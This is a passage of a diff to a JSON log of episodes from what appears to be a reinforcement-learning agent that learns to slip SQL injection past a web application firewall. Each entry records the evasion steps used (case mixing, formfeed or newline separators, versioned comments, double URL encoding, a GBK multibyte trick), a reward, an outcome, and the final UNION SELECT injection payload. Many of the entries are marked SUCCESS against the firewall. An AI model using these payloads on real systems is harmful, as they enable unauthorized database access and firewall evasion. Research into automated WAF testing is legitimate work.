-    "final_payload": "0'+unION+SElecT+1,2,3;%00"
+    "final_payload": "0'%0cuNIoN%0cSeLecT%0c1,2,3;%00"
   },
   {
     "episode": 197,
@@ -4043,9 +3997,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNiOn%0aSeLecT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNIon%0cseLeCT%0c1,2,3;%00"
   },
   {
     "episode": 198,
@@ -4055,9 +4009,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIoN%0aSelecT%0a1,2,3;%00"
+    "final_payload": "0'%0cunIon%0csElecT%0c1,2,3;%00"
   },
   {
     "episode": 199,
@@ -4067,22 +4021,21 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNioN%0aseLeCt%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIoN%0cSelecT%0c1,2,3;%00"
   },
   {
     "episode": 200,
-    "steps": 3,
-    "total_reward": 5.52,
+    "steps": 2,
+    "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
-      "paren_full",
-      "newline",
-      "case"
+      "case",
+      "formfeed"
     ],
-    "final_payload": "0'%0aunION%0aSeLEct%0a1,2,3;%00"
+    "final_payload": "0'%0cUNIOn%0cSelecT%0c1,2,3;%00"
   },
   {
     "episode": 201,
@@ -4092,9 +4045,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIOn%0aSElECT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNiOn%0cseLEcT%0c1,2,3;%00"
   },
   {
     "episode": 202,
@@ -4103,23 +4056,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_12345",
-      "crlf",
-      "double_and",
+      "double_encode",
+      "tab_space",
       "comment",
-      "crlf",
+      "case_split",
+      "comment",
+      "url_encode",
       "comment",
       "formfeed",
+      "hash_nl",
       "comment",
       "between_space",
       "comment",
-      "vtab",
-      "newline",
-      "vtab",
-      "newline",
-      "formfeed"
+      "formfeed",
+      "comment",
+      "plus_sep"
     ],
-    "final_payload": "0'%0d%0a/*!12345UNION%0d%0aSELECT*/%0d%0a1,2,3;%00"
+    "final_payload": "0'%2520UNIoN%2520SeLeCt%25201,2,3;%00"
   },
   {
     "episode": 203,
@@ -4129,46 +4082,34 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIon%0aSeLecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNIon%0cselEcT%0c1,2,3;%00"
   },
   {
     "episode": 204,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "char_split",
-      "crlf",
-      "between_space",
-      "tab_space",
-      "vtab",
-      "newline",
-      "formfeed",
-      "tab_space",
-      "crlf",
-      "newline",
-      "crlf",
-      "tab_space",
-      "tab_space",
-      "crlf",
-      "newline"
-    ],
-    "final_payload": "0'%0d%0a/*U*//*N*//*I*//*O*//*N*/%0d%0a/*S*//*E*//*L*//*E*//*C*//*T*/%0d%0a1,2,3;%00"
-  },
-  {
-    "episode": 205,
     "steps": 2,
     "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnioN%0asELecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnION%0cSeleCT%0c1,2,3;%00"
+  },
+  {
+    "episode": 205,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case",
+      "backtick",
+      "formfeed"
+    ],
+    "final_payload": "0'%0cuNiON%0cSELect%0c1,2,3;%00"
   },
   {
     "episode": 206,
@@ -4178,9 +4119,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNIon%0aseLeCt%0a1,2,3;%00"
+    "final_payload": "0'%0cUNion%0csELECt%0c1,2,3;%00"
   },
   {
     "episode": 207,
@@ -4190,9 +4131,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnION%0asELeCt%0a1,2,3;%00"
+    "final_payload": "0'%0cUNIoN%0cSelECT%0c1,2,3;%00"
   },
   {
     "episode": 208,
@@ -4202,21 +4143,34 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIOn%0aSELECt%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIoN%0cSELEct%0c1,2,3;%00"
   },
   {
     "episode": 209,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -27.1,
+    "success": false,
+    "final_result": "SQL_ERROR",
     "sequence": [
+      "backtick",
+      "formfeed",
+      "plus_sep",
+      "newline",
+      "formfeed",
+      "newline",
+      "between_space",
+      "newline",
+      "tab_space",
+      "comment",
       "case",
+      "plus_sep",
+      "comment",
+      "comment",
       "newline"
     ],
-    "final_payload": "0'%0aUNiOn%0aSelECT%0a1,2,3;%00"
+    "final_payload": "0'%0c`unIoN`%0c`selecT`%0c1,2,3;%00"
   },
   {
     "episode": 210,
@@ -4226,9 +4180,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIOn%0aseLEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNion%0cSElecT%0c1,2,3;%00"
   },
   {
     "episode": 211,
@@ -4238,9 +4192,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNion%0asELeCt%0a1,2,3;%00"
+    "final_payload": "0'%0cUNioN%0cseLEcT%0c1,2,3;%00"
   },
   {
     "episode": 212,
@@ -4250,9 +4204,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNION%0aSeleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNiOn%0cSeLect%0c1,2,3;%00"
   },
   {
     "episode": 213,
@@ -4262,9 +4216,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIOn%0aselecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUniOn%0csElEct%0c1,2,3;%00"
   },
   {
     "episode": 214,
@@ -4274,71 +4228,71 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIon%0aSELeCt%0a1,2,3;%00"
+    "final_payload": "0'%0cunION%0cseLEcT%0c1,2,3;%00"
   },
   {
     "episode": 215,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "url_mid_char",
+      "tab_space",
+      "nested_or",
+      "newline",
+      "between_space",
+      "newline",
+      "crlf",
+      "newline",
+      "vtab",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment",
+      "plus_sep",
+      "comment"
+    ],
+    "final_payload": "0'%09UN%49ON%09SEL%45CT%091,2,3;%00"
+  },
+  {
+    "episode": 216,
+    "steps": 15,
+    "total_reward": -19.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case",
+      "between_space",
+      "comment",
+      "comment",
+      "comment",
+      "comment",
+      "plus_sep",
+      "comment",
+      "newline",
+      "ver_12345",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
+    ],
+    "final_payload": "0'%a0/*!12345uNioN/**/SelECT*/%a01,2,3;%00"
+  },
+  {
+    "episode": 217,
     "steps": 2,
     "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIon%0aSelEcT%0a1,2,3;%00"
-  },
-  {
-    "episode": 216,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "hex_encode",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "nested_or",
-      "comment",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment"
-    ],
-    "final_payload": "0'%0aUNION%0aSELECT%0a0x31,0x32,0x33;%00"
-  },
-  {
-    "episode": 217,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "plus_sep",
-      "vtab",
-      "comment",
-      "case_split",
-      "comment",
-      "url_encode",
-      "comment",
-      "between_space",
-      "comment",
-      "vtab",
-      "comment",
-      "between_space",
-      "comment",
-      "formfeed",
-      "comment"
-    ],
-    "final_payload": "0'+uNiOn+selECT+1,2,3;%00"
+    "final_payload": "0'%0cUNIoN%0cSeleCt%0c1,2,3;%00"
   },
   {
     "episode": 218,
@@ -4348,9 +4302,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNioN%0asELECT%0a1,2,3;%00"
+    "final_payload": "0'%0cunIon%0cseLECT%0c1,2,3;%00"
   },
   {
     "episode": 219,
@@ -4360,9 +4314,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUniON%0asElect%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIoN%0cSElEct%0c1,2,3;%00"
   },
   {
     "episode": 220,
@@ -4372,9 +4326,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0aseLEct%0a1,2,3;%00"
+    "final_payload": "0'%0cuniOn%0csELecT%0c1,2,3;%00"
   },
   {
     "episode": 221,
@@ -4384,9 +4338,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIon%0aSElecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNIOn%0cSEleCT%0c1,2,3;%00"
   },
   {
     "episode": 222,
@@ -4396,9 +4350,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIoN%0aSeleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cunIoN%0cseLeCT%0c1,2,3;%00"
   },
   {
     "episode": 223,
@@ -4408,9 +4362,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auniOn%0aSElecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUniON%0cselECT%0c1,2,3;%00"
   },
   {
     "episode": 224,
@@ -4420,34 +4374,21 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNioN%0aseleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIon%0cSEleCt%0c1,2,3;%00"
   },
   {
     "episode": 225,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "param_pollute",
-      "tab_space",
-      "comment",
-      "tab_space",
-      "hex_encode",
-      "comment",
-      "tab_space",
-      "comment",
-      "tab_space",
-      "comment",
-      "crlf",
-      "comment",
-      "crlf",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%09UnIon/*&x=1*/sElECt/*&x=1*/1,2,3;%00"
+    "final_payload": "0'%0cUniON%0cSelEct%0c1,2,3;%00"
   },
   {
     "episode": 226,
@@ -4457,58 +4398,71 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "tab_space"
+      "formfeed"
     ],
-    "final_payload": "0'%09uNiON%09sELect%091,2,3;%00"
+    "final_payload": "0'%0cUnIoN%0cSelECt%0c1,2,3;%00"
   },
   {
     "episode": 227,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
-    "sequence": [
-      "case",
-      "newline"
-    ],
-    "final_payload": "0'%0auNION%0aSELEct%0a1,2,3;%00"
-  },
-  {
-    "episode": 228,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
-    "sequence": [
-      "case",
-      "newline"
-    ],
-    "final_payload": "0'%0aunIoN%0aSeleCt%0a1,2,3;%00"
-  },
-  {
-    "episode": 229,
     "steps": 15,
     "total_reward": -39.6,
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "formfeed",
       "plus_sep",
+      "newline",
+      "newline",
       "comment",
-      "url_mid_char",
+      "formfeed",
+      "newline",
+      "newline",
+      "tab_space",
       "newline",
       "vtab",
-      "vtab",
-      "plus_sep",
       "comment",
-      "double_encode",
-      "comment",
-      "case",
-      "comment",
-      "plus_sep",
-      "comment"
+      "formfeed",
+      "newline",
+      "crlf",
+      "crlf"
     ],
-    "final_payload": "0'%0cUN%49ON%0cSEL%45CT%0c1,2,3;%00"
+    "final_payload": "0'+UNION+SELECT+1,2,3;%00"
+  },
+  {
+    "episode": 228,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "ver_newline",
+      "crlf",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "comment",
+      "comment",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment",
+      "between_space",
+      "comment",
+      "plus_sep"
+    ],
+    "final_payload": "0'%0d%0a%0A/*!50000%55NION*/%0d%0a/*!%53ELECT*/%0A%0d%0a1,2,3;%00"
+  },
+  {
+    "episode": 229,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case",
+      "formfeed"
+    ],
+    "final_payload": "0'%0cuNiON%0cseleCT%0c1,2,3;%00"
   },
   {
     "episode": 230,
@@ -4518,9 +4472,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNION%0aSELECt%0a1,2,3;%00"
+    "final_payload": "0'%0cunIoN%0cselECt%0c1,2,3;%00"
   },
   {
     "episode": 231,
@@ -4530,9 +4484,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNioN%0aseLEct%0a1,2,3;%00"
+    "final_payload": "0'%0cunION%0csElECT%0c1,2,3;%00"
   },
   {
     "episode": 232,
@@ -4542,9 +4496,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUniON%0aseLEct%0a1,2,3;%00"
+    "final_payload": "0'%0cunION%0csElECt%0c1,2,3;%00"
   },
   {
     "episode": 233,
@@ -4554,9 +4508,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUniOn%0aseLeCT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIon%0cSelEct%0c1,2,3;%00"
   },
   {
     "episode": 234,
@@ -4566,9 +4520,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIoN%0aseLECt%0a1,2,3;%00"
+    "final_payload": "0'%0cUnION%0cseLeCT%0c1,2,3;%00"
   },
   {
     "episode": 235,
@@ -4578,9 +4532,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auniOn%0aseLEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cUniON%0csEleCt%0c1,2,3;%00"
   },
   {
     "episode": 236,
@@ -4590,9 +4544,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNIon%0aseLEct%0a1,2,3;%00"
+    "final_payload": "0'%0cuniON%0cseLeCt%0c1,2,3;%00"
   },
   {
     "episode": 237,
@@ -4602,9 +4556,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0aSeleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNion%0cSElECT%0c1,2,3;%00"
   },
   {
     "episode": 238,
@@ -4614,9 +4568,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auniOn%0aSElEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cuNioN%0cSelEcT%0c1,2,3;%00"
   },
   {
     "episode": 239,
@@ -4626,9 +4580,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIon%0aselECT%0a1,2,3;%00"
+    "final_payload": "0'%0cUniOn%0cselECT%0c1,2,3;%00"
   },
   {
     "episode": 240,
@@ -4638,22 +4592,21 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNion%0aselecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUniON%0csELeCT%0c1,2,3;%00"
   },
   {
     "episode": 241,
-    "steps": 3,
-    "total_reward": 5.52,
+    "steps": 2,
+    "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "nested_and",
       "formfeed"
     ],
-    "final_payload": "0'%0cunIOn%0csElect%0c1,2,3;%00"
+    "final_payload": "0'%0cUnIOn%0cSelEct%0c1,2,3;%00"
   },
   {
     "episode": 242,
@@ -4663,21 +4616,34 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUniON%0aselEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNion%0cSeLEcT%0c1,2,3;%00"
   },
   {
     "episode": 243,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
     "sequence": [
-      "case",
-      "newline"
+      "double_encode",
+      "crlf",
+      "comment",
+      "url_mid_char",
+      "comment",
+      "keyword_split",
+      "comment",
+      "between_space",
+      "newline",
+      "formfeed",
+      "newline",
+      "between_space",
+      "newline",
+      "vtab",
+      "tab_space"
     ],
-    "final_payload": "0'%0aUNIoN%0aselecT%0a1,2,3;%00"
+    "final_payload": "0'%2520UN%49ON%2520SEL%45CT%25201,2,3;%00"
   },
   {
     "episode": 244,
@@ -4687,9 +4653,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "crlf"
+      "formfeed"
     ],
-    "final_payload": "0'%0d%0aunIon%0d%0asELeCt%0d%0a1,2,3;%00"
+    "final_payload": "0'%0cuNIoN%0cselEcT%0c1,2,3;%00"
   },
   {
     "episode": 245,
@@ -4699,9 +4665,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIOn%0aSElecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNiON%0csELECt%0c1,2,3;%00"
   },
   {
     "episode": 246,
@@ -4711,9 +4677,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auniOn%0aSELEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNIon%0cSElect%0c1,2,3;%00"
   },
   {
     "episode": 247,
@@ -4723,9 +4689,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0aselECt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNion%0cSeleCt%0c1,2,3;%00"
   },
   {
     "episode": 248,
@@ -4735,9 +4701,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIOn%0aSEleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cuniOn%0csELect%0c1,2,3;%00"
   },
   {
     "episode": 249,
@@ -4747,9 +4713,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0aseLECt%0a1,2,3;%00"
+    "final_payload": "0'%0cuNIoN%0cSeleCt%0c1,2,3;%00"
   },
   {
     "episode": 250,
@@ -4759,21 +4725,34 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNiOn%0aSeLeCt%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIoN%0cseleCT%0c1,2,3;%00"
   },
   {
     "episode": 251,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
     "sequence": [
-      "case",
-      "newline"
+      "nested_or",
+      "crlf",
+      "plus_sep",
+      "newline",
+      "plus_sep",
+      "tab_space",
+      "vtab",
+      "crlf",
+      "vtab",
+      "comment",
+      "url_encode",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf"
     ],
-    "final_payload": "0'%0aUnIon%0aSElEct%0a1,2,3;%00"
+    "final_payload": "0'%0d%0a%55NION%0d%0a%53ELECT%0d%0a1,2,3;%00"
   },
   {
     "episode": 252,
@@ -4783,9 +4762,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0aSELEct%0a1,2,3;%00"
+    "final_payload": "0'%0cunION%0cselecT%0c1,2,3;%00"
   },
   {
     "episode": 253,
@@ -4795,21 +4774,34 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNIOn%0aSeleCT%0a1,2,3;%00"
+    "final_payload": "0'%0cUNiON%0cSeleCt%0c1,2,3;%00"
   },
   {
     "episode": 254,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
     "sequence": [
       "case",
+      "hash_nl",
+      "vtab",
+      "comment",
+      "newline",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "comment",
+      "comment",
+      "tab_space",
+      "comment",
+      "tab_space",
       "newline"
     ],
-    "final_payload": "0'%0aUniOn%0aSELeCt%0a1,2,3;%00"
+    "final_payload": "0'%0buNiOn%23xyz%0ASELEcT%0b1,2,3;%00"
   },
   {
     "episode": 255,
@@ -4819,9 +4811,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnioN%0aSEleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cunioN%0csEleCt%0c1,2,3;%00"
   },
   {
     "episode": 256,
@@ -4831,34 +4823,22 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIoN%0asElect%0a1,2,3;%00"
+    "final_payload": "0'%0cunIon%0csELEct%0c1,2,3;%00"
   },
   {
     "episode": 257,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
-      "hash_nl",
-      "vtab",
-      "comment",
-      "vtab",
-      "comment",
-      "formfeed",
-      "comment",
-      "formfeed",
-      "newline",
-      "comment",
-      "crlf",
-      "newline",
-      "comment",
-      "tab_space",
-      "newline"
+      "case",
+      "nested_and",
+      "crlf"
     ],
-    "final_payload": "0'%0bUNION%23xyz%0ASELECT%0b1,2,3;%00"
+    "final_payload": "0'%0d%0aunIon%0d%0asELeCt%0d%0a1,2,3;%00"
   },
   {
     "episode": 258,
@@ -4868,9 +4848,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunioN%0aSelECt%0a1,2,3;%00"
+    "final_payload": "0'%0cUNioN%0cSelECt%0c1,2,3;%00"
   },
   {
     "episode": 259,
@@ -4880,9 +4860,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIon%0aselecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIon%0cSeLecT%0c1,2,3;%00"
   },
   {
     "episode": 260,
@@ -4892,9 +4872,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnIOn%0aSElect%0a1,2,3;%00"
+    "final_payload": "0'%0cUniOn%0cSeLect%0c1,2,3;%00"
   },
   {
     "episode": 261,
@@ -4904,9 +4884,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIoN%0aSElEct%0a1,2,3;%00"
+    "final_payload": "0'%0cUNion%0csELeCT%0c1,2,3;%00"
   },
   {
     "episode": 262,
@@ -4916,21 +4896,34 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNiOn%0aSeLect%0a1,2,3;%00"
+    "final_payload": "0'%0cuNion%0cSElect%0c1,2,3;%00"
   },
   {
     "episode": 263,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
     "sequence": [
-      "tab_space",
+      "double_encode",
+      "vtab",
+      "hash_nl",
+      "comment",
+      "char_split",
+      "comment",
+      "plus_sep",
+      "comment",
+      "double_encode",
+      "comment",
+      "plus_sep",
+      "comment",
+      "double_encode",
+      "comment",
       "case"
     ],
-    "final_payload": "0'%09UnIoN%09sELeCt%091,2,3;%00"
+    "final_payload": "0'%2520/*U*//*N*//*I*//*O*//*N*/%2520/*S*//*E*//*L*//*E*//*C*//*T*/%25201,2,3;%00"
   },
   {
     "episode": 264,
@@ -4940,9 +4933,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auNIOn%0asELEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIOn%0csELecT%0c1,2,3;%00"
   },
   {
     "episode": 265,
@@ -4952,44 +4945,35 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNioN%0aseLEcT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnIon%0cSelEcT%0c1,2,3;%00"
   },
   {
     "episode": 266,
-    "steps": 3,
-    "total_reward": 5.52,
-    "success": true,
-    "final_result": "SUCCESS",
-    "sequence": [
-      "case",
-      "char_split",
-      "vtab"
-    ],
-    "final_payload": "0'%0bUnIOn%0bSelEct%0b1,2,3;%00"
-  },
-  {
-    "episode": 267,
     "steps": 2,
     "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnION%0asElect%0a1,2,3;%00"
+    "final_payload": "0'%0cuNiON%0cSeLECt%0c1,2,3;%00"
   },
   {
-    "episode": 268,
+    "episode": 267,
     "steps": 15,
     "total_reward": -39.6,
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "paren_space",
-      "tab_space",
+      "hex_encode",
+      "convert_charset",
+      "comment",
+      "newline",
+      "comment",
+      "gbk_bypass",
       "comment",
       "comment",
       "newline",
@@ -4997,14 +4981,22 @@
       "comment",
       "newline",
       "comment",
-      "newline",
       "comment",
-      "tab_space",
-      "newline",
-      "comment",
-      "comment"
+      "newline"
     ],
-    "final_payload": "0'%09UNION(SELECT%09(1),(2),(3;%00))"
+    "final_payload": "0%bf%27/**/UNION/**/SELECT/**/0x31,0x32,0x33;%00"
+  },
+  {
+    "episode": 268,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case",
+      "formfeed"
+    ],
+    "final_payload": "0'%0cUNiON%0cselECT%0c1,2,3;%00"
   },
   {
     "episode": 269,
@@ -5014,9 +5006,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUNIoN%0aselecT%0a1,2,3;%00"
+    "final_payload": "0'%0cUnION%0cseLECT%0c1,2,3;%00"
   },
   {
     "episode": 270,
@@ -5026,9 +5018,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
